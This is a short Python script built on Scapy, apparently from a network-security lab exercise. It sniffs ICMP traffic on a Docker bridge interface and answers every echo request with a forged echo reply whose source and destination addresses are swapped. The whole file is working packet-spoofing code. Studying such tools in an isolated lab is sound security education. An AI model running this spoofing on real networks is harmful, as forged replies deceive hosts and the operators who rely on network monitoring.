#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    pkt.show()
    a = IP()
    a.id = pkt.getlayer(IP).id
    a.src = pkt.getlayer(IP).dst
    a.dst = pkt.getlayer(IP).src
    a.ttl = 99
    b = ICMP()
    b.type = 0 #here
    b.id = pkt.getlayer(ICMP).id
    b.seq = pkt.getlayer(ICMP).seq

    data = pkt[Raw].load

    spoof_pkt = a/b/data
    
    if pkt.getlayer(ICMP).type == 8:
        spoof_pkt.show()
        send(spoof_pkt)
    #pkt.show()


#TODO: sniff on the interface for net-10.9.0.0
pkt = sniff(iface=['br-571ca9d9e6df'], filter='icmp', prn=spoof_pkt)


